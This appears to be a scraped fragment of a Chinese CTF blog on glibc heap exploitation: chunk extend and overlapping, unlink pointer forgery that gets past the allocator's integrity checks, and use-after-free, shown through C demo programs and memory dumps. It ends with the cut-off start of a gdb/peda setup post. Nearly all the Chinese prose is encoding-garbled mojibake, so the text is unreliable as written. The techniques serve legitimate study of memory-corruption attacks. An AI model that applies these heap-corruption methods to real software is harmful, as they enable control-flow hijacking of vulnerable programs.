0x602000: 0x0000000000000000 0x0000000000000021 &lt;=== chunk 10x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x0000000000000021 &lt;=== chunk 20x602030: 0x0000000000000000 0x00000000000000000x602040: 0x0000000000000000 0x0000000000020fc1 &lt;=== top chunk ä¹‹åï¼Œæˆ‘ä»¬æŠŠ chunk1 çš„ size åŸŸæ›´æ”¹ä¸º0x41ï¼Œ0x41 æ˜¯å› ä¸º chunk çš„ size åŸŸåŒ…å«äº†ç”¨æˆ·æ§åˆ¶çš„å¤§å°å’Œ header çš„å¤§å°ã€‚å¦‚ä¸Šæ‰€ç¤ºä¸¤ä¸ªchunkå¤§å°ä¹‹å’Œä¸º 0x40ã€‚åœ¨é¢˜ç›®ä¸­è¿™ä¸€æ­¥å¯ä»¥ç”±å †æº¢å‡ºå¾—åˆ°ã€‚ 0x602000: 0x0000000000000000 0x0000000000000041 &lt;=== ç¯¡æ”¹å¤§å°0x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x00000000000000210x602030: 0x0000000000000000 0x00000000000000000x602040: 0x0000000000000000 0x0000000000020fc1 æ‰§è¡Œ free ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ° chunk2 ä¸ chunk1 åˆæˆä¸€ä¸ª 0x40 å¤§å°çš„ chunkï¼Œä¸€èµ·é‡Šæ”¾äº†ï¼š Fastbins[idx=0, size=0x10] 0x00Fastbins[idx=1, size=0x20] 0x00Fastbins[idx=2, size=0x30] â† Chunk(addr=0x602010, size=0x40, flags=PREV_INUSE) Fastbins[idx=3, size=0x40] 0x00Fastbins[idx=4, size=0x50] 0x00Fastbins[idx=5, size=0x60] 0x00Fastbins[idx=6, size=0x70] 0x00 ä¹‹åæˆ‘ä»¬é€šè¿‡ malloc(0x30) å¾—åˆ° chunk1+chunk2 çš„å—ï¼Œæ­¤æ—¶å°±å¯ä»¥ç›´æ¥æ§åˆ¶ chunk2 ä¸­çš„å†…å®¹ï¼Œæˆ‘ä»¬ä¹ŸæŠŠè¿™ç§çŠ¶æ€ç§°ä¸º overlapping chunkã€‚ call 0x400450 &lt;malloc@plt&gt;mov QWORD PTR [rbp-0x8], raxrax = 0x602010 ç±»å‹2-å¯¹ inuse çš„ smallbin è¿›è¡Œ extendé€šè¿‡ä¹‹å‰æ·±å…¥ç†è§£å †çš„å®ç°éƒ¨åˆ†çš„å†…å®¹ï¼Œæˆ‘ä»¬å¾—çŸ¥å¤„äº fastbin èŒƒå›´çš„ chunk é‡Šæ”¾åä¼šè¢«ç½®å…¥ fastbin é“¾è¡¨ä¸­ï¼Œè€Œä¸å¤„äºè¿™ä¸ªèŒƒå›´çš„ chunk è¢«é‡Šæ”¾åä¼šè¢«ç½®äº unsorted bin é“¾è¡¨ä¸­ã€‚ ä»¥ä¸‹è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ 0x80 è¿™ä¸ªå¤§å°æ¥åˆ†é…å †ï¼ˆä½œä¸ºå¯¹æ¯”ï¼Œfastbin é»˜è®¤çš„æœ€å¤§çš„ chunk å¯ä½¿ç”¨èŒƒå›´æ˜¯ 0x70ï¼‰ int main(){ void *ptr,*ptr1; ptr=malloc(0x80);//åˆ†é…ç¬¬ä¸€ä¸ª 0x80 çš„chunk1 malloc(0x10); //åˆ†é…ç¬¬äºŒä¸ª 0x10 çš„chunk2 malloc(0x10); //é˜²æ­¢ä¸top chunkåˆå¹¶ *(int *)((int)ptr-0x8)=0xb1; free(ptr); ptr1=malloc(0xa0);} åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œå› ä¸ºåˆ†é…çš„ size ä¸å¤„äº fastbin çš„èŒƒå›´ï¼Œå› æ­¤åœ¨é‡Šæ”¾æ—¶å¦‚æœä¸ top chunk ç›¸è¿ä¼šå¯¼è‡´å’Œ top chunk åˆå¹¶ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦é¢å¤–åˆ†é…ä¸€ä¸ª chunkï¼ŒæŠŠé‡Šæ”¾çš„å—ä¸ top chunk éš”å¼€ã€‚ 0x602000: 0x0000000000000000 0x00000000000000b1 &lt;===chunk1 ç¯¡æ”¹sizeåŸŸ0x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x00000000000000000x602030: 0x0000000000000000 0x00000000000000000x602040: 0x0000000000000000 0x00000000000000000x602050: 0x0000000000000000 0x00000000000000000x602060: 0x0000000000000000 0x00000000000000000x602070: 0x0000000000000000 0x00000000000000000x602080: 0x0000000000000000 0x00000000000000000x602090: 0x0000000000000000 0x0000000000000021 &lt;=== chunk20x6020a0: 0x0000000000000000 0x00000000000000000x6020b0: 0x0000000000000000 0x0000000000000021 &lt;=== é˜²æ­¢åˆå¹¶çš„chunk0x6020c0: 0x0000000000000000 0x00000000000000000x6020d0: 0x0000000000000000 0x0000000000020f31 &lt;=== top chunk é‡Šæ”¾åï¼Œchunk1 æŠŠ chunk2 çš„å†…å®¹åå¹¶æ‰å¹¶ä¸€èµ·ç½®å…¥ unsorted binï¼š 0x602000: 0x0000000000000000 0x00000000000000b1 &lt;=== è¢«æ”¾å…¥unsorted bin0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 &lt;=== fdï¼Œbk0x602020: 0x0000000000000000 0x00000000000000000x602030: 0x0000000000000000 0x00000000000000000x602040: 0x0000000000000000 0x00000000000000000x602050: 0x0000000000000000 0x00000000000000000x602060: 0x0000000000000000 0x00000000000000000x602070: 0x0000000000000000 0x00000000000000000x602080: 0x0000000000000000 0x00000000000000000x602090: 0x0000000000000000 0x00000000000000210x6020a0: 0x0000000000000000 0x00000000000000000x6020b0: 0x00000000000000b0 0x0000000000000020 &lt;=== æ³¨æ„æ­¤å¤„æ ‡è®°ä¸ºç©º0x6020c0: 0x0000000000000000 0x00000000000000000x6020d0: 0x0000000000000000 0x0000000000020f31 &lt;=== top chunk [+] unsorted_bins[0]: fw=0x602000, bk=0x602000 â†’ Chunk(addr=0x602010, size=0xb0, flags=PREV_INUSE) å†æ¬¡è¿›è¡Œåˆ†é…çš„æ—¶å€™å°±ä¼šå–å› chunk1 å’Œ chunk2 çš„ç©ºé—´ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶ chunk2 ä¸­çš„å†…å®¹ 0x4005b0 &lt;main+74&gt; call 0x400450 &lt;malloc@plt&gt;â†’ 0x4005b5 &lt;main+79&gt; mov QWORD PTR [rbp-0x8], rax rax : 0x0000000000602010 ç±»å‹3-å¯¹ free çš„ smallbin è¿›è¡Œ extendè¿™ä¸ªç±»å‹çš„åˆ©ç”¨æ˜¯åœ¨ç¬¬äºŒç§ç±»å‹çš„åŸºç¡€ä¸Šè¿›è¡Œçš„ï¼Œè¿™æ¬¡æˆ‘ä»¬å…ˆé‡Šæ”¾ chunk1ï¼Œç„¶åå†ä¿®æ”¹å¤„äº unsorted bin ä¸­çš„ chunk1 çš„ size åŸŸã€‚ int main(){ void *ptr,*ptr1; ptr=malloc(0x80);//åˆ†é…ç¬¬ä¸€ä¸ª0x80çš„chunk1 malloc(0x10);//åˆ†é…ç¬¬äºŒä¸ª0x10çš„chunk2 free(ptr);//é¦–å…ˆè¿›è¡Œé‡Šæ”¾ï¼Œä½¿å¾—chunk1è¿›å…¥unsorted bin *(int *)((int)ptr-0x8)=0xb1; ptr1=malloc(0xa0);} ä¸¤æ¬¡ malloc ä¹‹åçš„ç»“æœå¦‚ä¸‹ï¼š 0x602000: 0x0000000000000000 0x0000000000000091 &lt;=== chunk 10x602010: 0x0000000000000000 0x00000000000000000x602020: 0x0000000000000000 0x00000000000000000x602030: 0x0000000000000000 0x00000000000000000x602040: 0x0000000000000000 0x00000000000000000x602050: 0x0000000000000000 0x00000000000000000x602060: 0x0000000000000000 0x00000000000000000x602070: 0x0000000000000000 0x00000000000000000x602080: 0x0000000000000000 0x00000000000000000x602090: 0x0000000000000000 0x0000000000000021 &lt;=== chunk 20x6020a0: 0x0000000000000000 0x00000000000000000x6020b0: 0x0000000000000000 0x0000000000020f51 æˆ‘ä»¬é¦–å…ˆé‡Šæ”¾ chunk1 ä½¿å®ƒè¿›å…¥ unsorted bin ä¸­ï¼š unsorted_bins[0]: fw=0x602000, bk=0x602000 â†’ Chunk(addr=0x602010, size=0x90, flags=PREV_INUSE)0x602000: 0x0000000000000000 0x0000000000000091 &lt;=== è¿›å…¥unsorted bin0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b78 &lt;=== fdï¼Œbk0x602020: 0x0000000000000000 0x00000000000000000x602030: 0x0000000000000000 0x00000000000000000x602040: 0x0000000000000000 0x00000000000000000x602050: 0x0000000000000000 0x00000000000000000x602060: 0x0000000000000000 0x00000000000000000x602070: 0x0000000000000000 0x00000000000000000x602080: 0x0000000000000000 0x00000000000000000x602090: 0x0000000000000090 0x0000000000000020 &lt;=== chunk 20x6020a0: 0x0000000000000000 0x00000000000000000x6020b0: 0x0000000000000000 0x0000000000020f51 &lt;=== top chunk ç„¶åç¯¡æ”¹ chunk1 çš„ size åŸŸï¼š 0x602000: 0x0000000000000000 0x00000000000000b1 &lt;=== sizeåŸŸè¢«ç¯¡æ”¹0x602010: 0x00007ffff7dd1b78 0x00007ffff7dd1b780x602020: 0x0000000000000000 0x00000000000000000x602030: 0x0000000000000000 0x00000000000000000x602040: 0x0000000000000000 0x00000000000000000x602050: 0x0000000000000000 0x00000000000000000x602060: 0x0000000000000000 0x00000000000000000x602070: 0x0000000000000000 0x00000000000000000x602080: 0x0000000000000000 0x00000000000000000x602090: 0x0000000000000090 0x00000000000000200x6020a0: 0x0000000000000000 0x00000000000000000x6020b0: 0x0000000000000000 0x0000000000020f51 æ­¤æ—¶å†è¿›è¡Œ malloc åˆ†é…å°±å¯ä»¥å¾—åˆ° chunk1+chunk2 çš„å †å—ï¼Œä»è€Œæ§åˆ¶äº† chunk2 çš„å†…å®¹ã€‚ Chunk Extend/Shrink å¯ä»¥åšä»€ä¹ˆ?ä¸€èˆ¬æ¥è¯´ï¼Œè¿™ç§æŠ€æœ¯å¹¶ä¸èƒ½ç›´æ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œä½†æ˜¯å¯ä»¥æ§åˆ¶ chunk ä¸­çš„å†…å®¹ã€‚å¦‚æœ chunk å­˜åœ¨å­—ç¬¦ä¸²æŒ‡é’ˆã€å‡½æ•°æŒ‡é’ˆç­‰ï¼Œå°±å¯ä»¥åˆ©ç”¨è¿™äº›æŒ‡é’ˆæ¥è¿›è¡Œä¿¡æ¯æ³„æ¼å’Œæ§åˆ¶æ‰§è¡Œæµç¨‹ã€‚ æ­¤å¤–é€šè¿‡ extend å¯ä»¥å®ç° chunk overlappingï¼Œé€šè¿‡ overlapping å¯ä»¥æ§åˆ¶ chunk çš„ fd/bk æŒ‡é’ˆä»è€Œå¯ä»¥å®ç° fastbin attack ç­‰åˆ©ç”¨ã€‚ ç±»å‹4-é€šè¿‡ extend åå‘ overlappingè¿™é‡Œå±•ç¤ºé€šè¿‡ extend è¿›è¡Œåå‘ overlappingï¼Œè¿™ä¹Ÿæ˜¯åœ¨ CTF ä¸­æœ€å¸¸å‡ºç°çš„æƒ…å†µï¼Œé€šè¿‡ overlapping å¯ä»¥å®ç°å…¶å®ƒçš„ä¸€äº›åˆ©ç”¨ã€‚ int main(){ void *ptr,*ptr1; ptr=malloc(0x10);//åˆ†é…ç¬¬1ä¸ª 0x10 çš„chunk1 malloc(0x10); //åˆ†é…ç¬¬2ä¸ª 0x10 çš„chunk2 malloc(0x10); //åˆ†é…ç¬¬3ä¸ª 0x10 çš„chunk3 malloc(0x10); //åˆ†é…ç¬¬4ä¸ª 0x10 çš„chunk4 *(int *)((int)ptr-0x8)=0x61; free(ptr); ptr1=malloc(0x50);} åœ¨ malloc(0x50) å¯¹ extend åŒºåŸŸé‡æ–°å ä½åï¼Œå…¶ä¸­ 0x10 çš„ fastbin å—ä¾ç„¶å¯ä»¥æ­£å¸¸çš„åˆ†é…å’Œé‡Šæ”¾ï¼Œæ­¤æ—¶å·²ç»æ„æˆ overlappingï¼Œé€šè¿‡å¯¹ overlapping çš„è¿›è¡Œæ“ä½œå¯ä»¥å®ç° fastbin attackã€‚ ç±»å‹5-é€šè¿‡ extend å‰å‘ overlappingè¿™é‡Œå±•ç¤ºé€šè¿‡ä¿®æ”¹ pre_inuse åŸŸå’Œ pre_size åŸŸå®ç°åˆå¹¶å‰é¢çš„å— int main(void){ void *ptr1,*ptr2,*ptr3,*ptr4; ptr1=malloc(128);//smallbin1 ptr2=malloc(0x10);//fastbin1 ptr3=malloc(0x10);//fastbin2 ptr4=malloc(128);//smallbin2 malloc(0x10);//é˜²æ­¢ä¸topåˆå¹¶ free(ptr1); *(int *)((long long)ptr4-0x8)=0x90;//ä¿®æ”¹pre_inuseåŸŸ *(int *)((long long)ptr4-0x10)=0xd0;//ä¿®æ”¹pre_sizeåŸŸ free(ptr4);//unlinkè¿›è¡Œå‰å‘extend malloc(0x150);//å ä½å—} å‰å‘ extend åˆ©ç”¨äº† smallbin çš„ unlink æœºåˆ¶ï¼Œé€šè¿‡ä¿®æ”¹ pre_size åŸŸå¯ä»¥è·¨è¶Šå¤šä¸ª chunk è¿›è¡Œåˆå¹¶å®ç° overlappingã€‚ Unlink(æ²¡æç‰¹åˆ«æ‡‚)æ¼æ´åŸç†æˆ‘ä»¬åœ¨åˆ©ç”¨ unlink æ‰€é€ æˆçš„æ¼æ´æ—¶ï¼Œå…¶å®å°±æ˜¯å¯¹ chunk è¿›è¡Œå†…å­˜å¸ƒå±€ï¼Œç„¶åå€ŸåŠ© unlink æ“ä½œæ¥è¾¾æˆä¿®æ”¹æŒ‡é’ˆçš„æ•ˆæœã€‚ unlinkæ“ä½œå°±æ˜¯æŠŠä¸€ä¸ªåŒå‘é“¾è¡¨ä¸­çš„ç©ºé—²å—æ‹¿å‡ºæ¥ï¼ˆä¾‹å¦‚ free æ—¶å’Œç›®å‰ç‰©ç†ç›¸é‚»çš„ free chunk è¿›è¡Œåˆå¹¶ï¼‰ã€‚å…¶åŸºæœ¬çš„è¿‡ç¨‹å¦‚ä¸‹ï¼š å¤è€çš„unlinkåœ¨æœ€åˆ unlink å®ç°çš„æ—¶å€™ï¼Œå…¶å®æ˜¯æ²¡æœ‰å¯¹ chunk çš„ size æ£€æŸ¥å’ŒåŒå‘é“¾è¡¨æ£€æŸ¥çš„ï¼Œå³æ²¡æœ‰å¦‚ä¸‹æ£€æŸ¥ä»£ç ï¼š // ç”±äº P å·²ç»åœ¨åŒå‘é“¾è¡¨ä¸­ï¼Œæ‰€ä»¥æœ‰ä¸¤ä¸ªåœ°æ–¹è®°å½•å…¶å¤§å°ï¼Œæ‰€ä»¥æ£€æŸ¥ä¸€ä¸‹å…¶å¤§å°æ˜¯å¦ä¸€è‡´(sizeæ£€æŸ¥)if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (\"corrupted size vs. prev_size\"); \\// æ£€æŸ¥ fd å’Œ bk æŒ‡é’ˆ(åŒå‘é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥)if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); \\ // largebin ä¸­ next_size åŒå‘é“¾è¡¨å®Œæ•´æ€§æ£€æŸ¥ if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) \\ || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) \\ malloc_printerr (check_action, \\ \"corrupted double-linked list (not small)\", \\ P, AV); è¿™é‡Œæˆ‘ä»¬ä»¥ 32 ä½ä¸ºä¾‹ï¼Œå‡è®¾å †å†…å­˜æœ€åˆçš„å¸ƒå±€æ˜¯ä¸‹é¢çš„æ ·å­ï¼š ç°åœ¨æœ‰ç‰©ç†ç©ºé—´è¿ç»­çš„ä¸¤ä¸ª chunkï¼ˆQï¼ŒNextchunkï¼‰ï¼Œå…¶ä¸­ Q å¤„äºä½¿ç”¨çŠ¶æ€ã€Nextchunk å¤„äºé‡Šæ”¾çŠ¶æ€ã€‚é‚£ä¹ˆå¦‚æœæˆ‘ä»¬é€šè¿‡æŸç§æ–¹å¼ï¼ˆæ¯”å¦‚æº¢å‡ºï¼‰å°† Nextchunk çš„ fd å’Œ bk æŒ‡é’ˆä¿®æ”¹ä¸ºæŒ‡å®šçš„å€¼ã€‚åˆ™å½“æˆ‘ä»¬ free(Q) æ—¶ï¼š 1ã€glibc åˆ¤æ–­è¿™ä¸ªå—æ˜¯ small chunk 2ã€åˆ¤æ–­å‰å‘åˆå¹¶ï¼Œå‘ç°å‰ä¸€ä¸ª chunk å¤„äºä½¿ç”¨çŠ¶æ€ï¼Œä¸éœ€è¦å‰å‘åˆå¹¶ 3ã€åˆ¤æ–­åå‘åˆå¹¶ï¼Œå‘ç°åä¸€ä¸ª chunk å¤„äºç©ºé—²çŠ¶æ€ï¼Œéœ€è¦åˆå¹¶ 4ã€ç»§è€Œå¯¹ Nextchunk é‡‡å– unlink æ“ä½œ é‚£ä¹ˆ unlink å…·ä½“æ‰§è¡Œçš„æ•ˆæœæ˜¯ä»€ä¹ˆæ ·å­å‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥æ¥åˆ†æä¸€ä¸‹ï¼š 1ã€FD=P-&gt;fd = target addr -12 2ã€BK=P-&gt;bk = expect value 3ã€FD-&gt;bk = BKï¼Œå³ *(target addr-12+12)=BK=expect value 4ã€BK-&gt;fd = FDï¼Œå³ *(expect value +8) = FD = target addr-12 æˆ‘ä»¬ä¼¼ä¹å¯ä»¥é€šè¿‡ unlink ç›´æ¥å®ç°ä»»æ„åœ°å€è¯»å†™çš„ç›®çš„ï¼Œä½†æ˜¯æˆ‘ä»¬è¿˜æ˜¯éœ€è¦ç¡®ä¿ expect value +8 åœ°å€å…·æœ‰å¯å†™çš„æƒé™ã€‚ æ¯”å¦‚è¯´æˆ‘ä»¬å°†target addrè®¾ç½®ä¸ºæŸä¸ª got è¡¨é¡¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºè°ƒç”¨å¯¹åº”çš„ libc å‡½æ•°æ—¶ï¼Œå°±ä¼šç›´æ¥æ‰§è¡Œæˆ‘ä»¬è®¾ç½®çš„å€¼ï¼ˆexpect valueï¼‰å¤„çš„ä»£ç ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œexpect value+8 å¤„çš„å€¼è¢«ç ´åäº†ï¼Œéœ€è¦æƒ³åŠæ³•ç»•è¿‡ã€‚ å½“å‰çš„unlinkåˆšæ‰è€ƒè™‘çš„æ˜¯æ²¡æœ‰æ£€æŸ¥çš„æƒ…å†µï¼Œä½†æ˜¯ä¸€æ—¦åŠ ä¸Šæ£€æŸ¥ï¼Œå°±æ²¡æœ‰è¿™ä¹ˆç®€å•äº†ã€‚æˆ‘ä»¬çœ‹ä¸€ä¸‹å¯¹ fd å’Œ bk çš„æ£€æŸ¥ï¼š // fd bkif (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) \\ malloc_printerr (check_action, \"corrupted double-linked list\", P, AV); \\ æ­¤æ—¶ï¼š FD-&gt;bk = target addr - 12 + 12=target_addr BK-&gt;fd = expect value + 8 é‚£ä¹ˆæˆ‘ä»¬ä¸Šé¢æ‰€åˆ©ç”¨çš„ä¿®æ”¹ GOT è¡¨é¡¹çš„æ–¹æ³•å°±å¯èƒ½ä¸å¯ç”¨äº†ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ªé€ çš„æ–¹å¼ç»•è¿‡è¿™ä¸ªæœºåˆ¶ã€‚ é¦–å…ˆæˆ‘ä»¬é€šè¿‡è¦†ç›–ï¼Œå°† nextchunk çš„ FD æŒ‡é’ˆæŒ‡å‘äº† fakeFDï¼Œå°† nextchunk çš„ BK æŒ‡é’ˆæŒ‡å‘äº† fakeBK ã€‚é‚£ä¹ˆä¸ºäº†é€šè¿‡éªŒè¯ï¼Œæˆ‘ä»¬éœ€è¦ï¼š fakeFD -&gt; bk == P &lt;=&gt; *(fakeFD + 12) == P fakeBK -&gt; fd == P &lt;=&gt; *(fakeBK + 8) == P å½“æ»¡è¶³ä¸Šè¿°ä¸¤å¼æ—¶ï¼Œå¯ä»¥è¿›å…¥ Unlink çš„ç¯èŠ‚ï¼Œè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š fakeFD -&gt; bk = fakeBK &lt;=&gt; *(fakeFD + 12) = fakeBK fakeBK -&gt; fd = fakeFD &lt;=&gt; *(fakeBK + 8) = fakeFD å¦‚æœè®© fakeFD + 12 å’Œ fakeBK + 8 æŒ‡å‘åŒä¸€ä¸ªæŒ‡å‘ P çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆï¼š *P = P - 8 *P = P - 12 å³é€šè¿‡æ­¤æ–¹å¼ï¼ŒP çš„æŒ‡é’ˆæŒ‡å‘äº†æ¯”è‡ªå·±ä½ 12 çš„åœ°å€å¤„ã€‚æ­¤æ–¹æ³•è™½ç„¶ä¸å¯ä»¥å®ç°ä»»æ„åœ°å€å†™ï¼Œä½†æ˜¯å¯ä»¥ä¿®æ”¹æŒ‡å‘ chunk çš„æŒ‡é’ˆï¼Œè¿™æ ·çš„ä¿®æ”¹æ˜¯å¯ä»¥è¾¾åˆ°ä¸€å®šçš„æ•ˆæœçš„ã€‚ å¦‚æœæˆ‘ä»¬æƒ³è¦ä½¿å¾—ä¸¤è€…éƒ½æŒ‡å‘ Pï¼Œåªéœ€è¦æŒ‰ç…§å¦‚ä¸‹æ–¹å¼ä¿®æ”¹å³å¯ï¼š éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæˆ‘ä»¬å¹¶æ²¡æœ‰è¿èƒŒä¸‹é¢çš„çº¦æŸï¼Œå› ä¸º P åœ¨ Unlink å‰æ˜¯æŒ‡å‘æ­£ç¡®çš„ chunk çš„æŒ‡é’ˆã€‚ // ç”±äºPå·²ç»åœ¨åŒå‘é“¾è¡¨ä¸­ï¼Œæ‰€ä»¥æœ‰ä¸¤ä¸ªåœ°æ–¹è®°å½•å…¶å¤§å°ï¼Œæ‰€ä»¥æ£€æŸ¥ä¸€ä¸‹å…¶å¤§å°æ˜¯å¦ä¸€è‡´ã€‚if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) \\ malloc_printerr (\"corrupted size vs. prev_size\"); \\ æ­¤å¤–ï¼Œå…¶å®å¦‚æœæˆ‘ä»¬è®¾ç½® next chunk çš„ fd å’Œ bk å‡ä¸º nextchunk çš„åœ°å€ä¹Ÿæ˜¯å¯ä»¥ç»•è¿‡ä¸Šé¢çš„æ£€æµ‹çš„ã€‚ä½†æ˜¯è¿™æ ·çš„è¯ï¼Œå¹¶ä¸èƒ½è¾¾åˆ°ä¿®æ”¹æŒ‡é’ˆå†…å®¹çš„æ•ˆæœã€‚ åˆ©ç”¨æ€è·¯ 1ã€æ¡ä»¶ UAF ï¼Œå¯ä¿®æ”¹ free çŠ¶æ€ä¸‹ small bin æˆ–æ˜¯ unsorted bin çš„ fd å’Œ bk æŒ‡é’ˆ å·²çŸ¥ä½ç½®å­˜åœ¨ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å¯è¿›è¡Œ UAF çš„ chunk 2ã€æ•ˆæœä½¿å¾—å·²æŒ‡å‘ UAF chunk çš„æŒ‡é’ˆ ptr å˜ä¸º ptr - 0x18 3ã€æ€è·¯è®¾æŒ‡å‘å¯ UAF chunk çš„æŒ‡é’ˆçš„åœ°å€ä¸º ptrï¼š ä¿®æ”¹ fd ä¸º ptr - 0x18 ä¿®æ”¹ bk ä¸º ptr - 0x10 è§¦å‘ unlink ptr å¤„çš„æŒ‡é’ˆä¼šå˜ä¸º ptr - 0x18ã€‚ Use After Freeæ¼æ´åŸç†ç®€å•çš„è¯´ï¼ŒUse After Free å°±æ˜¯å…¶å­—é¢æ‰€è¡¨è¾¾çš„æ„æ€ï¼Œå½“ä¸€ä¸ªå†…å­˜å—è¢«é‡Šæ”¾ä¹‹åå†æ¬¡è¢«ä½¿ç”¨ã€‚ä½†æ˜¯å…¶å®è¿™é‡Œæœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š 1ã€å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆè¢«è®¾ç½®ä¸º NULL ï¼Œ ç„¶åå†æ¬¡ä½¿ç”¨ï¼Œè‡ªç„¶ç¨‹åºä¼šå´©æºƒï¼› 2ã€å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL ï¼Œç„¶ååœ¨å®ƒä¸‹ä¸€æ¬¡è¢«ä½¿ç”¨ä¹‹å‰ï¼Œæ²¡æœ‰ä»£ç å¯¹è¿™å—å†…å­˜å—è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆç¨‹åºå¾ˆæœ‰å¯èƒ½å¯ä»¥æ­£å¸¸è¿è½¬ï¼› 3ã€å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULLï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºå†æ¬¡ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œå°±å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°å¥‡æ€ªçš„é—®é¢˜ã€‚ è€Œæˆ‘ä»¬ä¸€èˆ¬æ‰€æŒ‡çš„Use After Freeæ¼æ´ä¸»è¦æ˜¯åä¸¤ç§ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ä¸€èˆ¬ç§°è¢«é‡Šæ”¾åæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL çš„å†…å­˜æŒ‡é’ˆä¸ºdangling pointerã€‚ ä¸€ä¸ªç®€å•çš„ç¤ºä¾‹ä»£ç ï¼š #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef struct name { char *myname; void (*func)(char *str);} NAME;void myprint(char *str) { printf(\"%s\\n\", str); }void printmyname() { printf(\"call print my name\\n\"); }int main() { NAME *a; a = (NAME *)malloc(sizeof(struct name)); a-&gt;func = myprint; a-&gt;myname = \"I can also use it\"; a-&gt;func(\"this is my function\"); // free without modify free(a); a-&gt;func(\"I can also use it\"); // free with modify a-&gt;func = printmyname; a-&gt;func(\"this is my function\"); // set NULL a = NULL; printf(\"this pogram will crash...\\n\"); a-&gt;func(\"can not be printed...\");} è¿è¡Œç»“æœå¦‚ä¸‹ï¼š âœ use_after_free git:(use_after_free) âœ— ./use_after_free this is my functionI can also use itcall print my namethis pogram will crash...[1] 38738 segmentation fault (core dumped) ./use_after_free å¯è§è¢«freeæ‰çš„chunkåˆè¢«æˆåŠŸè®¿é—®äº†ã€‚","link":"/2020/06/01/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/"},{"title":"å…¥å‘äºŒè¿›åˆ¶","text":"ä½œä¸ºä¸€åWEBèœç‹—ï¼Œä»Šå¤©å†³å®šå…¥å‘äºŒè¿›åˆ¶äº†ï¼Œå‡ºäºæå¤§çš„å¥½å¥‡å¿ƒå’Œæ±‚çŸ¥æ¬²ï¼ˆå…¶å®å°±æ˜¯è‡ªå·±å¤ªèœäº†ï¼Œæ€¥éœ€æ‹“å±•çŸ¥è¯†å•Š~ï¼‰ï¼ŒåŠ ä¸Šä¹Ÿæœ‰äº›è®¡ç®—æœºåŸç†çš„ä¸€äº›åŸºç¡€ï¼Œæƒ³ç€ä¸èƒ½æŠŠå­¦çš„ä¸œè¥¿ç»™åºŸæ‰ã€æ‰”æ‰ï¼Œæ‰€ä»¥å†³å®šå…¥å‘ï¼ ç¯å¢ƒé…ç½®1ã€å®‰è£…gdbå’Œæ’ä»¶padaä»åŸºç¡€åšèµ·ï¼Œå®‰è£…gdbä»¥åŠå…¶æ’ä»¶pada sudo apt-get install gdb è¿™é‡Œå¯èƒ½è¿˜éœ€è¦å®‰è£…ä¸€äº›åº“ï¼Œä¾æ®éœ€è¦å®‰è£…å³å¯ï¼Œä¹‹åå®‰è£…æ’ä»¶padaï¼ŒäºŒè¿›åˆ¶å¿…å¤‡æ’ä»¶ git clone https://github.com/longld/peda.git ~/peda gitæŠŠåº“æ‹‰ä¸‹æ¥ä¹‹åï¼ŒæŠŠsource ~/peda/peda.py å†™å…¥~/.gdbinit echo \"source ~/peda/peda.py\" &gt;&gt; ~/.gdbinit è£…padaçš„æ—¶å€™ä¹Ÿæœ‰ç”¨pipè£…çš„ï¼Œä½†æ˜¯å¯èƒ½å¯¼è‡´gdbç‰ˆæœ¬ä¸pythonç‰ˆæœ¬ä¸åŒ¹é…çš„é—®é¢˜ï¼Œå¦‚æœgdbè‡ªåŠ¨ç»‘å®špython3çš„è¯ï¼Œç›´æ¥pipä¸‹æ¥çš„padaç”¨ç€ä¼šæŠ¥é”™ã€‚ å®‰è£…å®Œæ¯•ï¼Œæµ‹è¯•ï¼š 2ã€å®‰è£…checksecchecksecå¯ä»¥æŸ¥çœ‹ç›®æ 